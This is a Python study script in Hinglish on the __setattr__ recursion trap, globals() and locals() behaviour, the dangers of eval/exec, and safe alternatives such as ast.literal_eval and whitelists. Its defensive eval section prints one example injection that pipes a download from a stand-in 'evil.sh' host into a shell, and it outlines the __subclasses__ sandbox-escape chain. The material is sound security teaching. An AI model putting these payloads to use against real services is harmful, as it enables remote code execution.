"""
DAY 54 — __setattr__ Recursion Trap + globals/locals + eval/exec Dangers
Architecture Level: Mid → Senior Python Backend (Security-critical)

WHY THIS MATTERS:
- __setattr__ override karna common hai (validation, frozen classes, ORMs) PAR
  ek classic trap hai jo infinite recursion → RecursionError deta hai. Interview
  me "why does this hang/crash" pucha jaata hai.
- eval/exec on user input = REMOTE CODE EXECUTION (RCE). Backend me yeh #1
  injection class hai. "Sandboxed eval" ek myth hai — neeche prove karenge.
- globals()/locals() ka behaviour subtle hai (locals() write unreliable) — yeh
  bhi puchha jaata hai.

GOLDEN BACKEND RULE (yaad rakho):
    "eval/exec/pickle/yaml.load on UNTRUSTED input = NEVER."
"""

import ast
import operator
import json


# ============ SECTION 1: __setattr__ Infinite Recursion Trap ============
#
# __setattr__(self, name, value) HAR attribute assignment pe call hota hai.
# Agar uske ANDAR tum `self.x = value` likho, woh DUBARA __setattr__ call karega
# → infinite recursion → RecursionError.

class BrokenSetattr:
    """GALAT — yeh infinite recursion karega."""
    def __setattr__(self, name, value):
        print(f"  setting {name}...")     # ye line baar baar print hoga
        self.__dict__  # noqa
        # NEECHE WALI LINE TRAP HAI:
        # self.name = value   # <-- ye DUBARA __setattr__ ko call karta hai!
        # Demo me commented hai taaki crash na ho; uncomment karne pe RecursionError.
        raise RuntimeError("Yahan self.<attr> = ... likhna recursion trap hai")


class FixedSetattr:
    """SAHI — object.__setattr__ / super().__setattr__ use karo.

    Yeh base implementation directly self.__dict__ me likhta hai, BINA tumhare
    __setattr__ ko dubara trigger kiye → recursion break.
    """
    def __setattr__(self, name, value):
        print(f"  validated '{name}' = {value!r}")
        object.__setattr__(self, name, value)   # <-- recursion-safe write
        # Equivalent: super().__setattr__(name, value)


class FrozenPoint:
    """Real-world: immutable/frozen class banane ke liye __setattr__ block karte.

    Construction ke baad koi attribute set nahi kar sakta. Yeh exactly woh pattern
    hai jo dataclasses(frozen=True) internally use karta hai.
    """
    __slots__ = ("x", "y", "_frozen")

    def __init__(self, x, y):
        object.__setattr__(self, "x", x)        # __init__ me bypass karke set
        object.__setattr__(self, "y", y)
        object.__setattr__(self, "_frozen", True)

    def __setattr__(self, name, value):
        if getattr(self, "_frozen", False):
            raise AttributeError(f"FrozenPoint immutable hai — '{name}' set nahi kar sakte")
        object.__setattr__(self, name, value)


def demo_setattr_trap():
    print("=" * 55)
    print("SECTION 1: __setattr__ recursion trap")
    print("=" * 55)

    print("Fixed version (object.__setattr__ se write):")
    obj = FixedSetattr()
    obj.a = 10
    obj.b = 20
    print(f"  obj.a={obj.a}, obj.b={obj.b}")

    print("Frozen class:")
    p = FrozenPoint(3, 4)
    print(f"  point = ({p.x}, {p.y})")
    try:
        p.x = 99
    except AttributeError as e:
        print(f"  blocked: {e}")

    # --- __getattr__ vs __getattribute__ — SAME trap recap ---
    print("\n__getattribute__ me bhi same trap:")
    print("  __getattribute__ ke andar `self.foo` likhna → dubara __getattribute__")
    print("  → recursion. Fix: object.__getattribute__(self, name).")
    print("  __getattr__ alag hai — woh SIRF tab call hota jab normal lookup FAIL ho,")
    print("  isliye usme self.<existing_attr> safe hai (lookup succeed → no re-trigger),")
    print("  par MISSING attr access karoge __getattr__ ke andar → wahi recursion.")


# ============ SECTION 2: globals() / locals() ============
#
# globals() → module-level namespace ka REAL dict (mutate karoge to actually badlega)
# locals()  → current scope ka namespace SNAPSHOT (function ke andar — write UNRELIABLE)

MODULE_LEVEL = "i am global"

def demo_globals_locals():
    print("\n" + "=" * 55)
    print("SECTION 2: globals() / locals()")
    print("=" * 55)

    # globals() = real module dict — yahan likha to module attr ban jaata
    globals()["INJECTED_GLOBAL"] = 42
    print(f"  globals()['MODULE_LEVEL'] = {globals()['MODULE_LEVEL']!r}")
    print(f"  injected global via globals(): {INJECTED_GLOBAL}")  # noqa: F821

    # locals() inside a function = SNAPSHOT, write UNRELIABLE
    x = 1
    loc = locals()
    loc["x"] = 999          # ye snapshot dict change karta hai...
    print(f"  after locals()['x']=999, actual x = {x}  (<-- still 1! write didn't stick)")
    # WHY: CPython me function locals fast-array (LOAD_FAST) me hote hain, dict me nahi.
    # locals() us array ka ek snapshot-dict banata hai. Snapshot ko likhne se real
    # local nahi badalta. (Module/class scope me locals() == globals()/class-dict,
    # wahan write stick karta hai — sirf function scope unreliable hai.)

    # Frame inspection one-liner (debugging me kaam aata):
    import inspect
    caller_locals = inspect.currentframe().f_locals   # current frame ke locals
    print(f"  frame locals keys: {sorted(k for k in caller_locals if not k.startswith('__'))}")


# ============ SECTION 3: eval / exec DANGERS (defensive education) ============
#
# eval(s) → s ko expression ki tarah evaluate, exec(s) → statements run.
# User input pe inhe lagana = attacker tumhare process me kuch bhi chala sakta.

def demo_eval_dangers():
    print("\n" + "=" * 55)
    print("SECTION 3: eval/exec injection (DEFENSIVE demo)")
    print("=" * 55)

    # Maan lo ek "calculator" endpoint user ki expression eval karta hai:
    def naive_calculator(expr):
        return eval(expr)   # <-- DANGEROUS

    print(f"  naive_calculator('2 + 3 * 4') = {naive_calculator('2 + 3 * 4')}")

    # INJECTION: attacker arithmetic nahi, ARBITRARY code bhej deta hai.
    # eval ke environment se woh __builtins__ tak pahunch jaata, jahan se
    # __import__('os').system('rm -rf ...') reachable hai.
    evil = "__import__('os').getcwd()"     # demo: filesystem access (read-only, safe)
    print(f"  EVIL expr '{evil}' →")
    print(f"    eval result: {eval(evil)!r}   (<-- attacker ne OS tak pahunch banai!)")
    print("    real attack: __import__('os').system('curl evil.sh | sh')")

    # "SANDBOXED EVAL" MYTH — eval(expr, {'__builtins__': {}}) supposedly safe?
    print("\n  MYTH: eval(expr, {'__builtins__': {}}) = safe sandbox? NAHI.")
    # __builtins__ empty karne par bhi, attacker object introspection se
    # bypass kar leta hai. Classic chain (yeh CONCEPT hai, hum chala nahi rahe):
    bypass = (
        "().__class__.__bases__[0].__subclasses__()  # → object subclasses\n"
        "    se warning/loader/Popen jaisa class dhoond ke arbitrary code → RCE"
    )
    print(f"    bypass chain:\n    {bypass}")
    print("  KYUN blacklisting fails: tum infinite dunder/subclass paths block nahi")
    print("  kar sakte. Har patch ke baad naya bypass milta — yeh arms race tum HAARTE ho.")
    print("  Conclusion: 'safe eval' jaisa kuch nahi. eval ko untrusted input se door rakho.")


# ============ SECTION 4: Safe Alternatives (yeh use karo) ============

def demo_safe_alternatives():
    print("\n" + "=" * 55)
    print("SECTION 4: Safe alternatives — eval ke bina")
    print("=" * 55)

    # (a) ast.literal_eval — sirf PYTHON LITERALS parse karta (int, str, list,
    #     dict, tuple, bool, None). Function calls / attr access ALLOWED NAHI.
    safe_data = ast.literal_eval("{'name': 'ashish', 'scores': [9, 8, 7]}")
    print(f"  ast.literal_eval (data only): {safe_data}")
    try:
        ast.literal_eval("__import__('os').system('ls')")   # blocked!
    except (ValueError, SyntaxError) as e:
        print(f"  literal_eval blocked malicious input: {type(e).__name__}")

    # (b) operator-map pattern — calculator WITHOUT eval.
    OPS = {
        '+': operator.add, '-': operator.sub,
        '*': operator.mul, '/': operator.truediv,
    }
    def safe_calc(a, op, b):
        if op not in OPS:
            raise ValueError(f"operator '{op}' allowed nahi")
        return OPS[op](a, b)
    print(f"  safe_calc(2, '*', 7) = {safe_calc(2, '*', 7)}  (no eval, only whitelisted ops)")

    # (c) getattr-whitelist pattern — dynamic dispatch bina eval.
    class Report:
        def daily(self):   return "daily report"
        def weekly(self):  return "weekly report"
    ALLOWED_METHODS = {"daily", "weekly"}
    def run_report(obj, name):
        if name not in ALLOWED_METHODS:          # WHITELIST, blacklist nahi
            raise ValueError(f"report '{name}' allowed nahi")
        return getattr(obj, name)()
    print(f"  run_report(weekly) = {run_report(Report(), 'weekly')!r}")

    # (d) json.loads — data interchange ke liye (config, API body). eval se kabhi
    #     JSON parse mat karo.
    cfg = json.loads('{"workers": 4, "debug": false}')
    print(f"  json.loads config: {cfg}")

    print("\n  BACKEND RULE: user input ko eval/exec me kabhi mat daalo.")
    print("    Data parse  → json.loads / ast.literal_eval")
    print("    Math        → operator-map / ast walk with whitelist")
    print("    Dispatch    → getattr + explicit whitelist set")


# ============ INTERVIEW QUESTIONS ============
"""
Q1: __setattr__ ke andar self.x = value likhne pe kya hota hai aur fix kya hai?
A : Infinite recursion → RecursionError, kyunki self.x = value DUBARA __setattr__
    trigger karta hai. Fix: object.__setattr__(self, name, value) ya
    super().__setattr__(name, value) — yeh base implementation seedha __dict__/slot
    me likhta hai bina tumhare override ko re-trigger kiye.

Q2: __getattr__ aur __getattribute__ me difference, aur recursion trap?
A : __getattribute__ HAR attribute access pe chalta (intercept all). Uske andar
    self.foo likhoge → re-trigger → recursion; fix object.__getattribute__. __getattr__
    SIRF tab chalta jab normal lookup FAIL ho jaaye (missing attr fallback). Usme
    existing attr access safe, par missing attr access dubara __getattr__ → recursion.

Q3: locals() me likhne se local variable kyun nahi badalta?
A : CPython function locals ko fast LOAD_FAST array me rakhta, dict me nahi. locals()
    us array ka snapshot-dict return karta. Snapshot ko mutate karne se real fast-local
    nahi badalta. Module/class scope me locals() asli namespace hota → wahan write stick
    karta. Isliye function ke andar locals() write unreliable maana jaata.

Q4: eval/exec user input pe kyun khatarnak hai? "Sandboxed eval" kaam karta?
A : eval/exec attacker ko tumhare process me arbitrary Python chalane deta — __builtins__
    aur object introspection (().__class__.__bases__...__subclasses__()) se os/Popen tak
    pahunch → RCE. __builtins__ empty karke "sandbox" banana myth hai: introspection se
    bypass ho jaata, blacklist arms-race tum haarte ho. Safe eval exist nahi karta.

Q5: eval ke safe alternatives kya hain?
A : Data parse → json.loads ya ast.literal_eval (sirf literals, koi call nahi). Math →
    operator-map ya ast walk with node-type whitelist. Dynamic method call → getattr +
    explicit allowed-set whitelist. Hamesha WHITELIST, kabhi blacklist nahi.

Q6: Production me kahan ye galti milti hai?
A : "Configurable formula" fields jo eval karte (pricing rules), dynamic filter strings,
    template engines jo expressions eval karte, ya CSV/JSON ko eval se parse karna. Sab
    jagah eval ko structured parsing + whitelist se replace karna chahiye.
"""


if __name__ == "__main__":
    demo_setattr_trap()
    demo_globals_locals()
    demo_eval_dangers()
    demo_safe_alternatives()
